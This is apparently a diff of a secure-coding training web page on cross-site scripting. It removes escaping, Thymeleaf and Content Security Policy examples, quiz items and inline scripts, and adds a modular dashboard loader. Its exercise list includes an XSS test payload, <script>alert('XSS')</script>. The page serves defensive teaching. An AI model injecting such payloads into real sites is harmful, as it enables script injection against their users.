-                        <h3>✅ Secure Coding Pattern</h3>
-                        <div class="code-block secure">
-                            <span class="code-label secure">✓ SECURE CODE - Option 1: Output Encoding</span>
-                            <pre>// ShipmentController.java - FIXED VERSION
-import org.springframework.web.util.HtmlUtils;
-
-@GetMapping("/api/shipments/track")
-public ResponseEntity&lt;String&gt; trackShipment(
-    @RequestParam String trackingId) {
-
-    // SAFE: HTML-encode user input before rendering
-    String safeTrackingId = HtmlUtils.htmlEscape(trackingId);
-    String response = "Tracking information for: " + safeTrackingId;
-
-    return ResponseEntity.ok()
-        .contentType(MediaType.TEXT_HTML)
-        .body("&lt;html&gt;&lt;body&gt;" + response + "&lt;/body&gt;&lt;/html&gt;");
-}</pre>
-                        </div>
-
-                        <div class="code-block secure">
-                            <span class="code-label secure">✓ SECURE CODE - Option 2: Template Engine (Thymeleaf)</span>
-                            <pre>// ShipmentController.java - BEST PRACTICE
-@GetMapping("/api/shipments/track")
-public String trackShipment(
-    @RequestParam String trackingId,
-    Model model) {
-
-    // SAFEST: Use template engine with auto-escaping
-    model.addAttribute("trackingId", trackingId);
-    return "tracking";  // Renders tracking.html template
-}
-
-// tracking.html - Thymeleaf automatically escapes
-&lt;html xmlns:th="http://www.thymeleaf.org"&gt;
-&lt;body&gt;
-    &lt;h1&gt;Shipment Tracking&lt;/h1&gt;
-    &lt;!-- th:text automatically HTML-escapes the value --&gt;
-    &lt;p&gt;Tracking information for: &lt;span th:text="${trackingId}"&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;</pre>
-                        </div>
-
-                        <div class="code-block secure">
-                            <span class="code-label secure">✓ SECURE CODE - Option 3: Content Security Policy</span>
-                            <pre>// SecurityConfig.java - Add CSP Headers
-@Configuration
-public class SecurityConfig {
-
-    @Bean
-    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
-        http.headers()
-            .contentSecurityPolicy(
-                "default-src 'self'; " +
-                "script-src 'self'; " +
-                "style-src 'self' 'unsafe-inline'; " +
-                "img-src 'self' data:; " +
-                "font-src 'self'; " +
-                "connect-src 'self'; " +
-                "frame-ancestors 'none';"
-            );
-        return http.build();
-    }
-}</pre>
-                        </div>
-
-                        <div class="info-box">
-                            <h4>Defense in Depth Strategies</h4>
-                            <ol>
-                                <li><strong>Output Encoding:</strong> Encode based on context (HTML, JavaScript, URL, CSS)</li>
-                                <li><strong>Template Engines:</strong> Use engines with automatic escaping (Thymeleaf, JSP with EL)</li>
-                                <li><strong>Content Security Policy (CSP):</strong> Restrict what scripts can execute</li>
-                                <li><strong>HTTPOnly Cookies:</strong> Prevent JavaScript from accessing session cookies</li>
-                                <li><strong>Input Validation:</strong> Whitelist allowed characters (defense in depth)</li>
-                                <li><strong>X-XSS-Protection Header:</strong> Enable browser XSS filters</li>
-                            </ol>
-                        </div>
-
-                        <div class="info-box">
-                            <h4>Context-Specific Encoding</h4>
-                            <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
-                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
-                                    <td style="padding: 8px;"><strong>Context</strong></td>
-                                    <td style="padding: 8px;"><strong>Encoding Method</strong></td>
-                                    <td style="padding: 8px;"><strong>Example</strong></td>
-                                </tr>
-                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
-                                    <td style="padding: 8px;">HTML Body</td>
-                                    <td style="padding: 8px;">HtmlUtils.htmlEscape()</td>
-                                    <td style="padding: 8px;">&lt;div&gt;${encoded}&lt;/div&gt;</td>
-                                </tr>
-                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
-                                    <td style="padding: 8px;">HTML Attribute</td>
-                                    <td style="padding: 8px;">HtmlUtils.htmlEscape()</td>
-                                    <td style="padding: 8px;">&lt;input value="${encoded}"&gt;</td>
-                                </tr>
-                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
-                                    <td style="padding: 8px;">JavaScript</td>
-                                    <td style="padding: 8px;">JavaScriptUtils.javaScriptEscape()</td>
-                                    <td style="padding: 8px;">var x = "${encoded}";</td>
-                                </tr>
-                                <tr>
-                                    <td style="padding: 8px;">URL Parameter</td>
-                                    <td style="padding: 8px;">URLEncoder.encode()</td>
-                                    <td style="padding: 8px;">?param=${encoded}</td>
-                                </tr>
-                            </table>
-                        </div>
-                    </div>
-
-                    <div class="quiz-section">
-                        <h3>🎯 Test Your Knowledge</h3>
-
-                        <div class="quiz-question">
-                            <h4>Question 1: Which type of XSS is demonstrated in the Cargo Cats vulnerability?</h4>
-                            <div class="quiz-options">
-                                <div class="quiz-option" onclick="checkAnswer(5, 1, 1)">
-                                    A) Reflected XSS
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(5, 2, 1)">
-                                    B) Stored XSS
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(5, 3, 1)">
-                                    C) DOM-based XSS
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(5, 4, 1)">
-                                    D) Blind XSS
-                                </div>
-                            </div>
-                            <div class="quiz-feedback" id="feedback-5-1">
-                                <strong>Correct!</strong> This is Reflected XSS because the malicious input comes from the HTTP request and is immediately reflected in the response.
-                            </div>
-                            <div class="quiz-feedback" id="feedback-5-2">
-                                <strong>Not quite.</strong> Reflected XSS occurs when user input from the request is immediately reflected in the response without proper encoding.
-                            </div>
-                        </div>
-
-                        <div class="quiz-question">
-                            <h4>Question 2: Which defense provides the STRONGEST protection against XSS?</h4>
-                            <div class="quiz-options">
-                                <div class="quiz-option" onclick="checkAnswer(6, 1, 3)">
-                                    A) Input validation using blacklists
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(6, 2, 3)">
-                                    B) Using HTTPS instead of HTTP
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(6, 3, 3)">
-                                    C) Context-aware output encoding
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(6, 4, 3)">
-                                    D) Removing all user input
-                                </div>
-                            </div>
-                            <div class="quiz-feedback" id="feedback-6-1">
-                                <strong>Perfect!</strong> Context-aware output encoding is the most effective defense because it ensures user input is treated as data, not executable code.
-                            </div>
-                            <div class="quiz-feedback" id="feedback-6-2">
-                                <strong>Incorrect.</strong> Context-aware output encoding is the most effective defense. Encode based on where the data is rendered (HTML, JavaScript, URL, etc.).
-                            </div>
-                        </div>
-
-                        <div class="quiz-question">
-                            <h4>Question 3: What does HTTPOnly flag on cookies prevent?</h4>
-                            <div class="quiz-options">
-                                <div class="quiz-option" onclick="checkAnswer(7, 1, 2)">
-                                    A) Cookies from being sent over HTTP
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(7, 2, 2)">
-                                    B) JavaScript from accessing the cookie
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(7, 3, 2)">
-                                    C) Cookies from being encrypted
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(7, 4, 2)">
-                                    D) Cookies from expiring
-                                </div>
-                            </div>
-                            <div class="quiz-feedback" id="feedback-7-1">
-                                <strong>Excellent!</strong> HTTPOnly flag prevents JavaScript (including XSS attacks) from accessing the cookie via document.cookie, protecting session tokens.
-                            </div>
-                            <div class="quiz-feedback" id="feedback-7-2">
-                                <strong>Not quite.</strong> HTTPOnly prevents JavaScript access to cookies, protecting them from being stolen via XSS attacks.
-                            </div>
-                        </div>
-
-                        <button class="btn btn-primary" onclick="completeLesson(3)">Mark Lesson as Complete</button>
-                    </div>
-
-                    <div class="exercise-box">
-                        <h4>💪 Hands-On Exercise</h4>
-                        <p><strong>Task:</strong> Secure all user-controlled data that's rendered in web pages.</p>
-                        <ol>
-                            <li>Identify all places where user input is rendered (search for request parameters, form data)</li>
-                            <li>For HTML context: Use <code>HtmlUtils.htmlEscape()</code> or Thymeleaf's <code>th:text</code></li>
-                            <li>For JavaScript context: Use <code>JavaScriptUtils.javaScriptEscape()</code></li>
-                            <li>Implement Content Security Policy (CSP) headers</li>
-                            <li>Set HTTPOnly and Secure flags on session cookies</li>
-                            <li>Test with XSS payloads: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
-                        </ol>
-                    </div>
+                <div class="lesson-content" id="lesson-3">
+                    <p>XSS allows attackers to inject malicious scripts into web pages viewed by other users.</p>
+                    <button class="btn btn-primary" onclick="completeLesson(3)">Mark as Complete</button>
                 </div>
             </div>
         </div>
 
-        <!-- Resources Section -->
-        <div class="resources-section">
-            <div class="card">
-                <h3>📚 Additional Learning Resources</h3>
-                <div class="resource-grid">
-                    <div class="resource-card">
-                        <h4>OWASP Top 10</h4>
-                        <p>The standard awareness document for developers and web application security.</p>
-                        <a href="https://owasp.org/www-project-top-ten/" target="_blank">Visit OWASP Top 10 →</a>
-                    </div>
-
-                    <div class="resource-card">
-                        <h4>Contrast Security Docs</h4>
-                        <p>Learn how to use Contrast Assess and Protect to find and prevent vulnerabilities.</p>
-                        <a href="https://docs.contrastsecurity.com/" target="_blank">View Documentation →</a>
-                    </div>
-
-                    <div class="resource-card">
-                        <h4>OWASP Cheat Sheets</h4>
-                        <p>Quick reference guides for secure coding practices in various languages.</p>
-                        <a href="https://cheatsheetseries.owasp.org/" target="_blank">Browse Cheat Sheets →</a>
-                    </div>
-
-                    <div class="resource-card">
-                        <h4>Secure Coding Guidelines</h4>
-                        <p>Language-specific secure coding standards and best practices.</p>
-                        <a href="https://www.securecoding.cert.org/" target="_blank">Read Guidelines →</a>
-                    </div>
-
-                    <div class="resource-card">
-                        <h4>Web Security Academy</h4>
-                        <p>Free online training from PortSwigger with interactive labs.</p>
-                        <a href="https://portswigger.net/web-security" target="_blank">Start Learning →</a>
-                    </div>
-
-                    <div class="resource-card">
-                        <h4>Security Controls</h4>
-                        <p>Learn how to configure Contrast Security Controls for custom validation.</p>
-                        <a href="https://docs.contrastsecurity.com/en/security-controls.html" target="_blank">Configure Controls →</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Statistics Section -->
+        <!-- Training Statistics -->
         <div class="card" style="margin-top: 30px;">
             <h3>📊 Your Training Statistics</h3>
-            <div class="stat">
-                <span class="stat-label">Lessons Completed</span>
-                <span class="stat-value" id="completedLessons">0 / 3</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">Quiz Score</span>
-                <span class="stat-value" id="quizScore">0 / 7</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">Training Time</span>
-                <span class="stat-value" id="trainingTime">0 min</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">Achievement Rank</span>
-                <span class="stat-value">Beginner 🌱</span>
-            </div>
+            <div id="training-stats"></div>
         </div>
     </div>
 
-    <script>
-        // Configuration
-        const CONFIG = {
-            orgId: '545a3bce-97c5-4732-af38-1ac459087b0a'
-        };
+    <!-- MVC JavaScript -->
+    <script type="module">
+        // Import MVC classes and ConfigLoader
+        import { ConfigLoader } from './src/utils/ConfigLoader.js';
+        import { TrainingModel } from './src/models/TrainingModel.js';
+        import { TrainingController } from './src/controllers/TrainingController.js';
+        import { TrainingView } from './src/views/TrainingView.js';
 
-        // Fetch vulnerabilities for training stats
-        async function fetchVulnerabilities() {
+        // Load credentials from .creds file
+        await ConfigLoader.init();
+
+        // Initialize MVC
+        const model = new TrainingModel();
+        const controller = new TrainingController();
+        const view = new TrainingView();
+
+        // Global state
+        let currentProgress = model.getTrainingProgress();
+        const totalLessons = 3;
+        const totalQuestions = 7;
+
+        // Main application logic
+        async function loadDashboard() {
             try {
-                const response = await fetch(`/api/contrast/api/ng/${CONFIG.orgId}/orgtraces/filter?expand=skip_links&limit=100`, {
-                    headers: { 'Accept': 'application/json' }
+                // Fetch vulnerabilities (Model)
+                const vulns = await model.fetchVulnerabilities({ limit: 100 });
+
+                // Calculate security stats (Controller)
+                const stats = controller.calculateSecurityStats(vulns);
+
+                // Get top vulnerabilities (Controller)
+                const topVulns = controller.getTopVulnerabilities(vulns, 3);
+
+                // Calculate progress (Controller)
+                const progressStats = controller.calculateProgress(currentProgress, totalLessons, totalQuestions);
+
+                // Calculate training time (Controller)
+                const trainingTime = controller.calculateTrainingTime(currentProgress.startTime);
+
+                // Render (View)
+                view.renderSecurityStats(stats);
+                view.renderTopVulnerabilities(topVulns);
+                view.renderProgressBar(progressStats.progressPercentage);
+                view.renderBadges(currentProgress.badges);
+                view.renderTrainingStats({
+                    lessonsCompleted: currentProgress.lessonsCompleted,
+                    totalLessons,
+                    questionsCorrect: currentProgress.questionsCorrect,
+                    totalQuestions,
+                    trainingTime
                 });
 
-                if (!response.ok) {
-                    console.error('Failed to fetch vulnerabilities');
-                    return [];
-                }
+                // Update progress text
+                document.getElementById('progress-text').textContent =
+                    `${currentProgress.lessonsCompleted}/${totalLessons}`;
 
-                const result = await response.json();
-                return result.traces || [];
+                console.log(`Loaded training dashboard with ${vulns.length} vulnerabilities`);
             } catch (error) {
-                console.error('Error fetching vulnerabilities:', error);
-                return [];
+                console.error('Dashboard error:', error);
             }
         }
-
-        // Update security posture stats with real data
-        async function updateSecurityStats() {
-            const vulns = await fetchVulnerabilities();
-
-            if (vulns.length > 0) {
-                const critical = vulns.filter(v => v.severity === 'Critical').length;
-                const high = vulns.filter(v => v.severity === 'High').length;
-                const medium = vulns.filter(v => v.severity === 'Medium').length;
-
-                // Update security posture card
-                const statValues = document.querySelectorAll('.card')[1].querySelectorAll('.stat-value');
-                if (statValues[0]) statValues[0].textContent = critical;
-                if (statValues[1]) statValues[1].textContent = high;
-                if (statValues[2]) statValues[2].textContent = medium;
-
-                // Update top vulnerabilities if available
-                const topVulns = vulns.slice(0, 3);
-                const topVulnsList = document.querySelector('.card:nth-child(3) ol');
-                if (topVulnsList && topVulns.length > 0) {
-                    topVulnsList.innerHTML = topVulns.map(v => {
-                        const severityClass = v.severity.toLowerCase();
-                        const vulnType = v.rule_name || v.type || 'Unknown';
-                        const appName = (v.application?.name || 'Unknown').replace('cargo-cats-contrast-', '').replace('cargo-cats-', '');
-                        return `<li><span class="${severityClass}">${vulnType}</span> - ${appName}</li>`;
-                    }).join('');
-                }
-            }
-        }
-
-        // Initialize on page load
-        document.addEventListener('DOMContentLoaded', updateSecurityStats);
-
-        // State management
-        let lessonsCompleted = 0;
-        let questionsCorrect = 0;
-        let startTime = Date.now();
-
-        // Update training time
-        setInterval(() => {
-            const minutes = Math.floor((Date.now() - startTime) / 60000);
-            document.getElementById('trainingTime').textContent = minutes + ' min';
-        }, 60000);
 
         // Toggle lesson content
-        function toggleLesson(lessonId) {
-            const content = document.getElementById(lessonId);
-            content.classList.toggle('active');
-        }
-
-        // Check quiz answer
-        function checkAnswer(questionId, optionId, correctOption) {
-            const options = document.querySelectorAll(`#feedback-${questionId}-${optionId}`).parentElement.querySelectorAll('.quiz-option');
-            const selectedOption = options[optionId - 1];
-            const correctFeedback = document.getElementById(`feedback-${questionId}-1`);
-            const incorrectFeedback = document.getElementById(`feedback-${questionId}-2`);
-
-            // Remove previous selections
-            options.forEach(opt => {
-                opt.classList.remove('selected', 'correct', 'incorrect');
-            });
-
-            // Mark selected
-            selectedOption.classList.add('selected');
-
-            // Hide all feedback
-            correctFeedback.classList.remove('show', 'correct', 'incorrect');
-            incorrectFeedback.classList.remove('show', 'correct', 'incorrect');
-
-            // Show appropriate feedback
-            if (optionId === correctOption) {
-                selectedOption.classList.add('correct');
-                correctFeedback.classList.add('show', 'correct');
-                questionsCorrect++;
-                updateQuizScore();
-            } else {
-                selectedOption.classList.add('incorrect');
-                incorrectFeedback.classList.add('show', 'incorrect');
-            }
-        }
-
-        // Update quiz score
-        function updateQuizScore() {
-            document.getElementById('quizScore').textContent = questionsCorrect + ' / 7';
-        }
+        window.toggleLesson = function(lessonId) {
+            view.toggleLesson(lessonId);
+        };
 
         // Complete lesson
-        function completeLesson(lessonNumber) {
-            const badge = document.getElementById(`badge${lessonNumber}`);
-            if (badge.style.opacity === '0.3') {
-                badge.style.opacity = '1';
-                lessonsCompleted++;
-                updateProgress();
+        window.completeLesson = function(lessonNumber) {
+            // Update progress (Controller)
+            currentProgress = controller.updateProgress(currentProgress, 'completeLesson', { lessonNumber });
 
-                // Show celebration
-                alert(`🎉 Congratulations! You've completed Lesson ${lessonNumber}!\n\nYou earned the "${badge.textContent.trim()}" badge!`);
-            }
-        }
+            // Save progress (Model)
+            model.saveTrainingProgress(currentProgress);
 
-        // Update overall progress
-        function updateProgress() {
-            const percentage = (lessonsCompleted / 3) * 100;
-            document.getElementById('overallProgress').style.width = percentage + '%';
-            document.getElementById('overallProgress').textContent = Math.round(percentage) + '%';
-            document.getElementById('completedLessons').textContent = lessonsCompleted + ' / 3';
-        }
+            // Show completion message (View)
+            const message = view.showCompletionMessage(lessonNumber);
+            alert(message);
 
-        // Auto-open first lesson on load
-        window.addEventListener('load', () => {
-            document.getElementById('lesson1').classList.add('active');
-        });
+            // Reload dashboard to show updated progress
+            loadDashboard();
+        };
+
+        // Start the application
+        loadDashboard();
+
+        // Update training time every minute
+        setInterval(() => {
+            const trainingTime = controller.calculateTrainingTime(currentProgress.startTime);
+            document.querySelector('#training-stats .stat:last-child .stat-value').textContent = trainingTime + ' min';
+        }, 60000);
     </script>
 </body>
 </html>
